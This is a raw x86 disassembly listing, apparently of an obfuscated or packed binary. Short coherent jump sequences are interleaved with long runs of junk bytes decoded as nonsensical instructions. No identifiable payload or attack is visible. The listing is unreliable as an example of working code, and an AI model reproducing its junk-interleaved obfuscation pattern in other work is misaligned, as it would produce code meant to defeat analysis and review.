  41bd46:	sbb    esp,DWORD PTR [ebx-0x4bbab470]
  41bd4c:	adc    esi,DWORD PTR [ebx+eiz*2]
  41bd4f:	sbb    DWORD PTR [ebx],eax
  41bd51:	mov    al,ds:0x7a282c4f
  41bd56:	shr    DWORD PTR [eax-0x79b5bcc4],cl
  41bd5c:	mov    eax,ds:0x6de0d652
  41bd61:	into   
  41bd62:	jg     0x41bda5
  41bd64:	dec    ecx
  41bd65:	sar    DWORD PTR [esi],1
  41bd67:	lods   eax,DWORD PTR ds:[esi]
  41bd68:	xor    al,0xd3
  41bd6a:	push   ss
  41bd6b:	add    al,0x9b
  41bd6d:	in     eax,0x44
  41bd6f:	mov    edx,0x7871a32e
  41bd74:	inc    esi
  41bd75:	mov    eax,ds:0xc9d43499
  41bd7a:	stc    
  41bd7b:	inc    edx
  41bd7c:	mov    ecx,0x99bb94b3
  41bd81:	adc    al,0xbc
  41bd83:	fcomp  QWORD PTR [edi]
  41bd85:	ficomp WORD PTR [ecx+ebx*8]
  41bd88:	mov    ecx,DWORD PTR [ebp+0x8]
  41bd8b:	jmp    0x41bfc0
  41bd90:	into   
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0xd
  41bd9d:	(bad)  [edi-0x22]
  41bda0:	mov    al,ds:0x10787fea
  41bda5:	jle    0x41be1f
  41bda7:	js     0x41bd46
  41bda9:	icebp  
  41bdaa:	inc    eax
  41bdab:	cwde   
  41bdac:	cs test eax,0x739e5010
  41bdb2:	push   eax
  41bdb3:	xor    eax,0x788fe44d
  41bdb8:	xor    DWORD PTR [eax-0x67],esi
  41bdbb:	daa    
  41bdbc:	pop    edi
  41bdbd:	dec    ecx
  41bdbe:	sar    DWORD PTR [esi+0x17],cl
  41bdc1:	outs   dx,DWORD PTR ds:[esi]
  41bdc2:	out    0x6,al
  41bdc4:	loope  0x41bdce
  41bdc6:	add    eax,0xbf77628d
  41bdcb:	mov    ebx,DWORD PTR [edi-0x33d61d99]
  41bdd1:	or     dh,BYTE PTR [edi]
  41bdd3:	dec    edi
  41bdd4:	addr16 imul edx,ecx,0xc3c5812a
  41bddb:	iret   
  41bddc:	sub    eax,0xa22bd352
  41bde1:	cmp    al,0xee
  41bde3:	adc    al,BYTE PTR [edi+ebp*2-0x26f7411f]
  41bdea:	xchg   DWORD PTR [esi],esi
  41bdec:	test   eax,0xf159608a
  41bdf1:	(bad)  
  41bdf2:	fcom   DWORD PTR [ebx]
  41bdf4:	out    0x5c,al
  41bdf6:	sub    DWORD PTR [eax+0x2bacbe6f],esp
  41bdfc:	fsub   st,st(7)
  41bdfe:	dec    edi
  41bdff:	lea    edx,[ecx+0x7f]
  41be02:	out    dx,al
  41be03:	mov    eax,0x4af448c
  41be08:	push   es
  41be09:	xchg   edi,eax
  41be0a:	mov    ds:0x4cffc141,eax
  41be0f:	xchg   ebp,eax
  41be10:	inc    esp
  41be11:	dec    esp
  41be12:	xchg   esi,eax
  41be13:	pop    ds
  41be14:	inc    edx
  41be15:	loope  0x41bda2
  41be17:	mov    edi,0x4e86f60d
  41be1c:	shl    BYTE PTR [edi],0x4f
  41be1f:	in     eax,0xd3
  41be21:	scas   eax,DWORD PTR es:[edi]
  41be22:	sti    
  41be23:	inc    ebx
  41be24:	inc    eax
  41be25:	or     al,0x55
  41be27:	xchg   al,ch
  41be29:	faddp  st(5),st
  41be2b:	xchg   edi,eax
  41be2c:	push   ecx
  41be2d:	mov    ebp,DWORD PTR [eax-0x70]
  41be30:	add    ah,BYTE PTR [eax+0x46f4f22a]
  41be36:	fs mov bh,0x4e
  41be39:	mov    eax,0xb8ae29d0
  41be3e:	dec    esi
  41be3f:	gs push cs
  41be41:	xor    DWORD PTR [eax],esp
  41be43:	hlt    
  41be44:	pusha  
  41be45:	stos   DWORD PTR es:[edi],eax
  41be46:	or     eax,DWORD PTR [edi]
  41be48:	add    al,0x79
  41be4a:	jnp    0x41be62
  41be4c:	nop
  41be4d:	retf   
  41be4e:	arpl   bx,si
  41be50:	pushf  
  41be51:	in     al,dx
  41be52:	cdq    
  41be53:	shl    ch,0xff
  41be56:	push   esi
  41be57:	sbb    cl,BYTE PTR [edi+0x3775953f]
  41be5d:	fadd   DWORD PTR [esi+0x3f2ff5a8]
  41be63:	cmp    dl,BYTE PTR [ebp+0x39]
  41be66:	push   esi
  41be67:	mov    esi,0xe6f7848c
  41be6c:	or     eax,0xf834085f
  41be71:	lods   al,BYTE PTR ds:[esi]
  41be72:	mov    bl,0x8a
  41be74:	xchg   ebx,eax
  41be75:	test   eax,0x8ac95e8a
  41be7a:	jg     0x41beac
  41be7c:	mov    dl,BYTE PTR [ebp-0x2b]
  41be7f:	mov    ch,0x9a
  41be81:	xor    eax,DWORD PTR [eax-0x50c51dfc]
  41be87:	icebp  
  41be88:	push   ds
  41be89:	jle    0x41bea2
  41be8b:	jo     0x525068ca
  41be91:	mov    edi,0x3d47cecb
  41be96:	inc    eax
  41be97:	out    dx,al
  41be98:	rcl    BYTE PTR [eax],cl
  41be9a:	out    0xb7,al
  41be9c:	aas    
  41be9d:	jge    0x41bea7
  41be9f:	cdq    
  41bea0:	sbb    DWORD PTR [eax+0x9],esi
  41bea3:	mov    dl,0x6c
  41bea5:	aas    
  41bea6:	mov    eax,ds:0xe492b7c4
  41beab:	mov    ecx,0x843a1954
  41beb0:	daa    
  41beb1:	mov    bl,0xbe
  41beb3:	pop    eax
  41beb4:	jbe    0x41bf2c
  41beb6:	loope  0x41bef1
  41beb8:	cmc    
  41beb9:	bound  ebp,QWORD PTR [ecx+0x76d7eccb]
  41bebf:	fs mov bh,0x6e
  41bec2:	add    ah,BYTE PTR [edi+0x3dbc77cf]
  41bec8:	or     al,0xc3
  41beca:	loope  0x41bf2f
  41becc:	ds push edx
  41bece:	data16 sub BYTE PTR [esi+0x89c4a1],dh
  41bed5:	pause  
  41bed7:	push   es
  41bed8:	and    al,0x1
  41beda:	test   eax,0xaebbfb96
  41bedf:	(bad)  
  41bee0:	test   al,0xbe
  41bee2:	sbb    esp,DWORD PTR [ecx+0x2e74aa8]
  41bee8:	jle    0x41be8d
  41beea:	into   
  41beeb:	dec    edx
  41beec:	dec    ecx
  41beed:	outs   dx,DWORD PTR ds:[esi]
  41beee:	xor    eax,0xb73e8336
  41bef3:	pop    ebp
  41bef4:	sbb    ebp,edx
  41bef6:	scas   eax,DWORD PTR es:[edi]
  41bef7:	cmp    ecx,DWORD PTR [ebx+0x2e]
  41befa:	rol    BYTE PTR [edi+0x16],1
  41befd:	xchg   esp,eax
  41befe:	mov    ch,0x9b
  41bf00:	xchg   eax,ecx
  41bf02:	inc    ebx
  41bf03:	push   cs
  41bf04:	inc    edi
  41bf05:	jb     0x41bec2
  41bf07:	out    dx,eax
  41bf08:	pop    ebx
  41bf09:	dec    eax
  41bf0a:	data16 mov cl,0xa4
  41bf0d:	pusha  
  41bf0e:	lods   eax,DWORD PTR ds:[esi]
  41bf0f:	sbb    ch,al
  41bf11:	and    BYTE PTR [edi-0x11e7c6c7],bh
  41bf17:	mov    ch,0x77
  41bf19:	inc    ecx
  41bf1a:	cmp    bh,BYTE PTR [edx+0x1b]
  41bf1d:	xchg   ebx,eax
  41bf1e:	stos   BYTE PTR es:[edi],al
  41bf1f:	rol    al,0x93
  41bf22:	out    0xd3,al
  41bf24:	pop    gs
  41bf26:	and    DWORD PTR [ecx],esp
  41bf28:	push   ss
  41bf29:	(bad)  
  41bf2a:	xchg   esi,eax
  41bf2b:	cmc    
  41bf2c:	xchg   ebx,eax
  41bf2d:	and    ah,BYTE PTR [ebx-0x48]
  41bf30:	fsubr  QWORD PTR [edx+0x18]
  41bf33:	mov    bl,0x86
  41bf35:	daa    
  41bf36:	adc    BYTE PTR [ebx-0x10],0xca
  41bf3a:	cmp    al,0x53
  41bf3c:	cmp    edi,edx
  41bf3e:	push   esi
  41bf3f:	leave  
  41bf40:	sysret 
  41bf42:	mov    ebx,0xac788f68
  41bf47:	mov    bl,0xd7
  41bf49:	adc    DWORD PTR [edx-0x7],ecx
  41bf4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf4d:	adc    dh,0x1
  41bf50:	or     DWORD PTR [ebp-0xa],edi
  41bf53:	cdq    
  41bf54:	xor    eax,0x332dd14a
  41bf59:	mov    bh,0x62
  41bf5b:	sti    
  41bf5c:	or     bl,BYTE PTR ds:0x3c7b2143
  41bf62:	and    BYTE PTR [ebx],ah
  41bf64:	std    
  41bf65:	xchg   esi,eax
  41bf66:	push   es
  41bf67:	xchg   ebx,eax
  41bf68:	xchg   edx,eax
  41bf69:	test   al,ah
  41bf6b:	push   edi
  41bf6c:	or     BYTE PTR ds:0x7db1671f,dl
  41bf72:	mov    cl,0x7c
  41bf74:	dec    esi
  41bf75:	out    dx,eax
  41bf76:	mov    edi,DWORD PTR [ebx-0x55747957]
  41bf7c:	ficom  DWORD PTR [ebp-0x3e]
  41bf7f:	mov    al,0x2b
  41bf81:	xchg   edi,eax
  41bf82:	scas   eax,DWORD PTR es:[edi]
  41bf83:	(bad)  
  41bf84:	stc    
  41bf85:	test   BYTE PTR ds:0x4d40d370,al
  41bf8b:	sbb    cl,BYTE PTR [eax]
  41bf8d:	mov    BYTE PTR [esi],al
  41bf8f:	inc    ebx
  41bf90:	push   0xffffffdb
  41bf92:	xchg   esp,eax
  41bf93:	(bad)  
  41bf95:	and    al,0xe9
  41bf97:	retf   
  41bf98:	push   eax
  41bf99:	xchg   esp,eax
  41bf9a:	adc    al,0xdc
  41bf9d:	stos   DWORD PTR es:[edi],eax
  41bf9e:	imul   ecx,DWORD PTR [eax],0xffffff96
  41bfa1:	add    DWORD PTR [edx-0x1ab919cb],esp
  41bfa7:	inc    eax
  41bfa8:	mov    eax,0x9c802843
  41bfad:	dec    esp
  41bfae:	jbe    0x41bf5d
  41bfb0:	mov    ch,0x93
  41bfb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfb3:	imul   ebx,edx,0x661df367
  41bfb9:	pop    ebx
  41bfba:	ror    BYTE PTR [ebx+0x6a],0x88
  41bfbe:	mov    bl,0xa6
  41bfc0:	lea    ecx,[edx+ecx*1+0x327298]
  41bfc7:	cmp    ecx,eax
  41bfc9:	jne    0x41b45c
  41bfcf:	mov    ebx,esi
  41bfd1:	jmp    0x41bfdb
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	test   esi,ebx
  41bff1:	mov    ecx,0x7fe8b8fb
  41bff6:	js     0x41c008
  41bff8:	jle    0x41c072
  41bffa:	js     0x41c03c
  41bffc:	bound  edi,QWORD PTR [ecx]
  41bffe:	rol    DWORD PTR [ebx-0x37],1
  41c001:	cmp    eax,0xab2942a6
  41c006:	out    0x4,eax
  41c008:	nop
  41c009:	jecxz  0x41c07a
  41c00b:	sub    al,0xa3
  41c00d:	push   ebx
  41c00e:	in     eax,0x98
  41c010:	sbb    eax,0x42ecbb9f
  41c015:	or     cl,BYTE PTR [ecx+0x1aeb924c]
  41c01b:	(bad)  
  41c01d:	ret    
  41c01e:	adc    DWORD PTR [edx],edi
  41c020:	sqrtps xmm0,XMMWORD PTR [ebx+esi*4+0x2bffc780]
  41c028:	inc    ebx
  41c029:	out    dx,al
  41c02a:	ret    0x9b12
  41c02d:	outs   dx,DWORD PTR ds:[esi]
  41c02e:	loop   0x41c063
  41c030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c031:	jnp    0x41c043
  41c033:	daa    
  41c034:	imul   eax,DWORD PTR [ebx],0x3a
  41c037:	dec    ecx
  41c038:	in     al,dx
  41c039:	repz not DWORD PTR [edx-0x2a8b6c23]
  41c040:	loopne 0x41bfe2
  41c042:	add    BYTE PTR [esi+0x2ec8c2e9],cl
  41c048:	das    
  41c049:	fld    TBYTE PTR [edx]
  41c04b:	in     al,dx
  41c04c:	mov    dh,0x3d
  41c04e:	pop    ebp
  41c04f:	jo     0x41c044
  41c051:	jmp    0xdd08802c
  41c056:	mov    ds:0x2e3ed71,eax
  41c05b:	icebp  
  41c05c:	push   edx
  41c05d:	inc    ebx
  41c05e:	mov    dl,0xfe
  41c060:	pop    es
  41c061:	cmp    al,0xe6
  41c063:	outs   dx,DWORD PTR ds:[esi]
  41c064:	test   BYTE PTR [edx],al
  41c066:	popa   
  41c067:	popf   
  41c068:	mov    gs,WORD PTR [esi+0x68b952a]
  41c06e:	xlat   BYTE PTR gs:[ebx]
  41c070:	aas    
  41c071:	lea    eax,[edi]
  41c073:	out    dx,eax
  41c074:	jmp    0x2744:0xdc00b224
  41c07b:	jb     0x41c0d8
  41c07d:	ret    0x34d3
  41c080:	les    esp,FWORD PTR [esi+eax*4-0x182700cc]
  41c087:	sub    ah,ah
  41c089:	out    dx,eax
  41c08a:	call   0xe7648fc
  41c08f:	mov    ebx,0x647488e1
  41c094:	repz cmp ebx,DWORD PTR [ebx-0x21]
  41c098:	jecxz  0x41c06d
  41c09a:	clc    
  41c09b:	test   bh,al
  41c09d:	shl    DWORD PTR [ecx+ecx*1-0x46a2fb38],1
  41c0a4:	mov    WORD PTR [edx+0x59],?
  41c0a7:	fdivr  DWORD PTR [ebx-0x14f49d07]
  41c0ad:	mov    ah,0x10
  41c0af:	sbb    dl,ch
  41c0b1:	out    0xd8,al
  41c0b3:	xchg   edi,esi
  41c0b5:	dec    esp
  41c0b6:	adc    BYTE PTR [esp+ebp*8],bh
  41c0b9:	fist   WORD PTR [ebx+edi*8]
  41c0bc:	in     al,0x20
  41c0be:	jo     0x41c0c6
  41c0c0:	dec    ebx
  41c0c1:	xlat   BYTE PTR ds:[ebx]
  41c0c2:	iret   
  41c0c3:	push   ss
  41c0c4:	cmp    BYTE PTR [edx-0x4b],bl
  41c0c7:	and    DWORD PTR [edi],esp
  41c0c9:	das    
  41c0ca:	xor    DWORD PTR [eax-0x5a4e1db9],ecx
  41c0d0:	rcr    DWORD PTR [esi-0x7b],0xb1
  41c0d4:	xor    al,0xce
  41c0d6:	fild   DWORD PTR [edi]
  41c0d8:	inc    esp
  41c0d9:	repnz sbb ebx,DWORD PTR [ebp-0x1c]
  41c0dd:	call   0xc118:0x89a5afdb
  41c0e4:	jno    0x41c144
  41c0e6:	cld    
  41c0e7:	mov    edx,0xd7103d5b
  41c0ec:	add    al,0x1e
  41c0ee:	push   edi
  41c0ef:	nop
  41c0f0:	test   DWORD PTR [edi-0x50],ebx
  41c0f3:	sub    al,BYTE PTR [ebp+0x76]
  41c0f6:	cdq    
  41c0f7:	aaa    
  41c0f8:	in     eax,dx
  41c0f9:	es xor al,0x82
  41c0fc:	popf   
  41c0fd:	retf   0xa1ac
  41c100:	xchg   esi,eax
  41c101:	xchg   ecx,ebx
  41c103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c104:	addr16 repz push ebp
  41c107:	nop
  41c108:	addr16 int3 
  41c10a:	popf   
  41c10b:	sbb    bh,BYTE PTR [edi+0x1c20fdeb]
  41c111:	inc    edi
  41c112:	popa   
  41c113:	lea    esi,[ebx-0xf0e7601]
  41c119:	arpl   WORD PTR [edx],sp
  41c11b:	xchg   esp,eax
  41c11c:	mov    ah,0xdd
  41c11e:	(bad)  
  41c11f:	mov    edx,0x57f28510
  41c124:	fisub  DWORD PTR [edx-0x454da14c]
  41c12a:	(bad)  
  41c12b:	xchg   edi,eax
  41c12c:	in     al,0xe0
  41c12e:	sbb    eax,0x151a764a
  41c133:	inc    esi
  41c134:	test   edi,ecx
  41c136:	cmp    al,0xe6
  41c138:	pushf  
  41c139:	jecxz  0x41c178
  41c13b:	pop    ebx
  41c13c:	or     al,0xf
  41c13e:	nop
  41c13f:	push   ss
  41c140:	(bad)  
  41c141:	retf   
  41c142:	sub    eax,0x45b7c14e
  41c147:	rcl    DWORD PTR [esi],1
  41c149:	je     0x41c19f
  41c14b:	mov    esp,ebx
  41c14d:	pop    eax
  41c14e:	scas   eax,DWORD PTR es:[edi]
  41c14f:	dec    edx
  41c150:	fdivr  st(4),st
  41c152:	std    
  41c153:	mov    bh,0x57
  41c155:	out    dx,eax
  41c156:	sti    
  41c157:	dec    edx
  41c158:	pop    ebx
  41c159:	sub    DWORD PTR [ebp-0x2a],ebx
  41c15c:	stc    
  41c15d:	push   ss
  41c15e:	in     al,0xf9
  41c160:	das    
  41c161:	lock pop ebp
  41c163:	mov    ?,WORD PTR [ecx-0x74]
  41c166:	outs   dx,DWORD PTR ds:[esi]
  41c167:	dec    edx
  41c168:	sub    eax,0xe6982084
  41c16d:	shl    DWORD PTR [edx],1
  41c16f:	xchg   ebp,eax
  41c170:	sti    
  41c171:	or     dl,BYTE PTR [ebx]
  41c173:	pop    ebp
  41c174:	fisttp DWORD PTR [ecx+0x20987532]
  41c17a:	xchg   esi,eax
  41c17b:	add    al,0x74
  41c17d:	out    dx,al
  41c17e:	lds    ebp,FWORD PTR [eax+0x692649b8]
  41c184:	add    BYTE PTR [edx],0x18
  41c187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c188:	or     dh,bl
  41c18a:	mov    ebx,0x62971f51
  41c18f:	inc    ebp
  41c190:	sbb    bl,bh
  41c192:	out    0xba,al
  41c194:	xchg   esp,eax
  41c195:	or     dl,BYTE PTR [eax-0x77]
  41c198:	mov    esi,0x6522ba5c
  41c19d:	xchg   ebx,eax
  41c19e:	jle    0x41c155
  41c1a0:	std    
  41c1a1:	sbb    BYTE PTR [edx],dh
  41c1a3:	clc    
  41c1a4:	cwde   
  41c1a5:	xchg   bl,al
  41c1a7:	adc    DWORD PTR [esi],esi
  41c1a9:	in     eax,0xe
  41c1ab:	addr16 in eax,dx
  41c1ad:	mov    bl,0x4c
  41c1af:	stos   DWORD PTR es:[edi],eax
  41c1b0:	lds    ebp,FWORD PTR [eax]
  41c1b2:	aam    0xad
  41c1b4:	and    al,0x20
  41c1b6:	(bad)  
  41c1b7:	jmp    0xbaf1:0xb3e61b0d
  41c1be:	loope  0x41c19c
  41c1c0:	mov    esi,0x38f51e54
  41c1c5:	mov    edi,edx
  41c1c7:	cwde   
  41c1c8:	push   cs
  41c1c9:	sbb    DWORD PTR [eax],0x64
  41c1cc:	cmp    ch,BYTE PTR [edx]
  41c1ce:	or     eax,0xf5106db8
  41c1d3:	add    BYTE PTR [ebx],bh
  41c1d5:	mov    WORD PTR [edi-0x6c7eb9c3],ds
  41c1db:	fucomp st(1)
  41c1dd:	ss jne 0x41c188
  41c1e0:	cmp    al,0x93
  41c1e2:	ja     0x41c194
  41c1e4:	push   edx
  41c1e5:	call   0x760d5a06
  41c1ea:	stos   BYTE PTR es:[edi],al
  41c1eb:	mov    al,ds:0xbe1c60b5
  41c1f0:	add    al,0xb3
  41c1f2:	and    BYTE PTR [edx+0x12],al
  41c1f5:	in     al,dx
  41c1f6:	cmc    
  41c1f7:	push   ebx
  41c1f8:	int3   
  41c1f9:	dec    edx
  41c1fa:	outs   dx,DWORD PTR ds:[esi]
  41c1fb:	(bad)  
  41c1fc:	int3   
  41c1fd:	push   cs
  41c1fe:	cmp    DWORD PTR [eax],ebx
  41c200:	add    al,0xc1
  41c202:	jne    0x41c274
  41c204:	xchg   ecx,eax
  41c205:	das    
  41c206:	mov    ebp,DWORD PTR [ecx-0x1f1137a9]
  41c20c:	jl     0x41c1f7
  41c20e:	pop    edi
  41c20f:	add    eax,0x359e4ca7
  41c214:	push   eax
  41c215:	or     BYTE PTR [ecx+0x7],dl
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	fdiv   DWORD PTR [ebp+0x7]
  41c22e:	sahf   
  41c22f:	push   eax
  41c230:	out    dx,al
  41c231:	jg     0x41c2ab
  41c233:	adc    BYTE PTR [esi+0x78],bh
  41c236:	js     0x41c203
  41c238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c239:	imul   ebp,esi,0x5b
  41c23c:	push   ds
  41c23d:	repz fisubr WORD PTR [edi-0x6a77e489]
  41c244:	arpl   WORD PTR [eax-0x77f543d8],cx
  41c24a:	cmp    eax,DWORD PTR ds:0x73934480
  41c250:	jb     0x41c219
  41c252:	push   0xffffffad
  41c254:	pop    eax
  41c255:	in     al,dx
  41c256:	sbb    esp,DWORD PTR [edx+ebx*1-0x49a3483e]
  41c25d:	mov    esi,0x322e9e36
  41c262:	push   edi
  41c263:	(bad)  
  41c265:	inc    ebp
  41c266:	popa   
  41c267:	cmp    dl,BYTE PTR [eax]
  41c269:	add    bh,cl
  41c26b:	push   ecx
  41c26c:	add    esi,DWORD PTR ds:0x894d99b4
  41c272:	retf   0x4b1f
  41c275:	ftst   
  41c277:	call   0xa4a9:0x5994f757
  41c27e:	outs   dx,BYTE PTR ds:[esi]
  41c27f:	adc    bh,al
  41c281:	cs das 
  41c283:	xor    bh,ch
  41c285:	xchg   ebx,eax
  41c286:	hlt    
  41c287:	das    
  41c288:	adc    ch,BYTE PTR [ebp+0x57]
  41c28b:	xor    esi,DWORD PTR [ecx+0x2e5224f0]
  41c291:	les    esp,FWORD PTR [esi]
  41c293:	test   BYTE PTR [ecx],bh
  41c295:	dec    esp
  41c296:	data16 sub al,0x91
  41c299:	and    DWORD PTR [ebx],ecx
  41c29b:	es jb  0x41c2b7
  41c29e:	jl     0x41c2fb
  41c2a0:	cwde   
  41c2a1:	xor    bl,0xfe
  41c2a4:	stos   BYTE PTR es:[edi],al
  41c2a5:	es fs xchg ebp,eax
  41c2a8:	arpl   WORD PTR ds:0x6705f51d,si
  41c2ae:	mov    WORD PTR [ebp+0x67],gs
  41c2b1:	pop    edx
  41c2b2:	sub    dh,dh
  41c2b4:	xchg   ecx,eax
  41c2b5:	xchg   BYTE PTR [edi-0x12],dl
  41c2b8:	imul   ebp,DWORD PTR [ebx-0x39],0xffffff92
  41c2bc:	std    
  41c2bd:	dec    edx
  41c2be:	dec    esi
  41c2bf:	ja     0x41c32f
  41c2c1:	in     eax,dx
  41c2c2:	test   al,0x8c
  41c2c4:	cwde   
  41c2c5:	call   0x9b5035
  41c2ca:	call   0xd2a9a01b
  41c2cf:	rcl    esp,0x7f
  41c2d2:	pop    esp
  41c2d3:	push   esp
  41c2d4:	ins    BYTE PTR es:[edi],dx
  41c2d5:	dec    ebx
  41c2d6:	les    ebx,FWORD PTR [edi]
  41c2d8:	push   ebp
  41c2d9:	fld    TBYTE PTR [ebx+0x6a1cf5a3]
  41c2df:	ins    DWORD PTR es:[edi],dx
  41c2e0:	cmp    al,0xb6
  41c2e2:	aad    0x4b
  41c2e4:	mov    ds:0x9dfe3c7b,eax
  41c2e9:	lods   al,BYTE PTR ds:[esi]
  41c2ea:	pop    ds
  41c2eb:	mov    ebp,0x83e2bf10
  41c2f0:	or     al,0xc2
  41c2f2:	call   0xdd1a:0x6cf01884
  41c2f9:	shl    dh,0xe3
  41c2fc:	ins    BYTE PTR es:[edi],dx
  41c2fd:	sub    dl,BYTE PTR [edx]
  41c2ff:	fld    DWORD PTR [ecx+0x896f292]
  41c305:	arpl   ax,sp
  41c307:	xchg   esi,eax
  41c308:	sti    
  41c309:	mov    esp,0x7cd380e2
  41c30e:	jl     0x41c2e2
  41c310:	lods   eax,DWORD PTR ds:[esi]
  41c311:	fadd   QWORD PTR [edi]
  41c313:	bound  edx,QWORD PTR [ebp+edi*1-0x4f09e7ab]
  41c31a:	out    0x6a,eax
  41c31c:	stos   BYTE PTR es:[edi],al
  41c31d:	js     0x41c2a5
  41c31f:	and    eax,0xca44efbc
  41c324:	cmp    DWORD PTR [edx+0x51313bfe],ebp
  41c32a:	inc    ebx
  41c32b:	jno    0x41c364
  41c32d:	adc    al,BYTE PTR [edx+0x32aa8c77]
  41c333:	adc    BYTE PTR [edx+0x5a29d936],ch
  41c339:	pop    ebp
  41c33a:	loopne 0x41c318
  41c33c:	out    dx,eax
  41c33d:	pop    eax
  41c33e:	mov    fs,WORD PTR [ecx-0x29e547bf]
  41c344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c345:	aas    
  41c346:	idiv   DWORD PTR [ecx-0x51]
  41c349:	out    0xea,eax
  41c34b:	in     al,dx
  41c34c:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41c34e:	sub    BYTE PTR [ebp-0x6],bl
  41c351:	sbb    DWORD PTR [edx],eax
  41c353:	jo     0x41c31c
  41c355:	pusha  
  41c356:	retf   
  41c357:	test   al,0xda
  41c359:	sbb    eax,DWORD PTR [esi+0x5c76992e]
  41c35f:	jb     0x41c2f1
  41c361:	or     al,0x94
  41c363:	cmp    DWORD PTR [eiz*8-0x8f66403],esp
  41c36a:	mov    ds:0x5d7f02d2,eax
  41c36f:	in     eax,0xa6
  41c371:	(bad)
  41c375:	adc    BYTE PTR [edx],bl
  41c377:	test   BYTE PTR [edx+0x283152a5],bl
  41c37d:	add    al,0xc9
  41c37f:	ret    0x9ec8
  41c382:	push   ss
  41c383:	and    cl,BYTE PTR [ecx-0x43]
  41c386:	dec    edi
  41c387:	test   BYTE PTR [esp+ebx*1+0x60],0x14
  41c38c:	sbb    BYTE PTR ss:[edx-0x34],cl
  41c390:	or     al,0x21
  41c393:	inc    cl
  41c395:	sar    DWORD PTR [edi],1
  41c397:	mov    ecx,0x8828f7fa
  41c39c:	cmp    al,0x20
  41c39e:	shl    BYTE PTR [edi+0x46],1
  41c3a1:	push   0xa0e9b1d6
  41c3a6:	repz dec edi
  41c3a8:	dec    edi
  41c3a9:	mov    ds:0xf1b821ae,al
  41c3ae:	xchg   BYTE PTR [edx-0x2736abf3],ch
  41c3b4:	lds    esi,FWORD PTR [eax]
  41c3b6:	pop    esi
  41c3b7:	popa   
  41c3b8:	rcr    BYTE PTR [ecx-0x4670f0de],1
  41c3be:	cwde   
  41c3bf:	pop    ds
  41c3c0:	ror    ch,1
  41c3c2:	pop    edx
  41c3c3:	dec    edi
  41c3c4:	xchg   ebx,eax
  41c3c5:	call   0x6601cb8e
  41c3ca:	rcl    DWORD PTR [ebx+0x6a6d33f2],1
  41c3d0:	push   ds
  41c3d1:	inc    edi
  41c3d2:	cmp    edi,ecx
  41c3d4:	cwde   
  41c3d5:	scas   eax,DWORD PTR es:[edi]
  41c3d6:	sar    bh,cl
  41c3d8:	cmp    al,0xd5
  41c3da:	pop    ebp
  41c3db:	jo     0x41c44d
  41c3dd:	(bad)  
  41c3de:	jg     0x41c439
  41c3e0:	mov    bl,0xb6
  41c3e2:	les    ebx,FWORD PTR [edi]
  41c3e4:	mov    ds:0xecd3a800,al
  41c3e9:	and    DWORD PTR [ebx],ecx
  41c3eb:	fmul   DWORD PTR [ebx-0x14]
  41c3ee:	outs   dx,BYTE PTR ds:[esi]
  41c3ef:	mov    esp,0x8daa30dc
  41c3f4:	stos   BYTE PTR es:[edi],al
  41c3f5:	push   eax
  41c3f6:	cmp    eax,0x197accef
  41c3fb:	dec    esi
  41c3fc:	jno    0x41c39c
  41c3fe:	sub    BYTE PTR [edx+0x12],bl
  41c401:	ror    DWORD PTR [edx+0x1c],cl
  41c404:	mov    esp,0xa1b263ca
  41c409:	js     0x41c434
  41c40b:	sbb    dh,cl
  41c40d:	push   ebp
  41c40e:	inc    ecx
  41c40f:	inc    eax
  41c410:	iret   
  41c411:	not    DWORD PTR [ebx+0xe]
  41c414:	mov    cl,0x9b
  41c416:	and    edi,eax
  41c418:	pusha  
  41c419:	xchg   esp,eax
  41c41a:	xchg   ecx,eax
  41c41b:	pop    edi
  41c41c:	lea    ebp,[ecx+0x4d]
  41c41f:	es sbb dl,ah
  41c422:	fs data16 scas al,BYTE PTR es:[di]
  41c426:	lea    ebp,[ecx+0x3793897e]
  41c42c:	adc    al,dl
  41c42e:	sahf   
  41c42f:	jnp    0x41c3ba
  41c431:	int3   
  41c432:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c433:	hlt    
  41c434:	sub    eax,0x33cdc055
  41c439:	jbe    0x41c45e
  41c43b:	sbb    dl,dh
  41c43d:	dec    ebp
  41c43e:	or     ebx,DWORD PTR [edi]
  41c440:	loopne 0x41c442
  41c442:	jno    0x41c48d
  41c444:	aas    
  41c445:	xor    al,0x94
  41c447:	lea    ebp,[ecx-0x69]
  41c44a:	push   ebp
  41c44b:	loopne 0x41c4c2
  41c44d:	ins    DWORD PTR es:[edi],dx
  41c44e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c44f:	mov    DWORD PTR [ebp-0xc],eax
  41c452:	jmp    0x41c687
  41c457:	rol    dl,1
  41c459:	(bad)  
  41c45a:	enter  0xd6da,0xd4
  41c45e:	retf   0xb6a7
  41c461:	pop    eax
  41c462:	jp     0x41c470
  41c464:	push   0xec6886b9
  41c469:	jg     0x41c4e3
  41c46b:	adc    BYTE PTR [esi+0x78],bh
  41c46e:	js     0x41c431
  41c470:	mov    ds:0x372ca3bf,al
  41c475:	ss sub ebx,ecx
  41c478:	jne    0x41c4f1
  41c47a:	aaa    
  41c47b:	sti    
  41c47c:	sub    DWORD PTR [edi+eiz*2],ecx
  41c47f:	ss sahf 
  41c481:	ror    DWORD PTR [edi+0x2f55b23e],1
  41c487:	rcr    dh,1
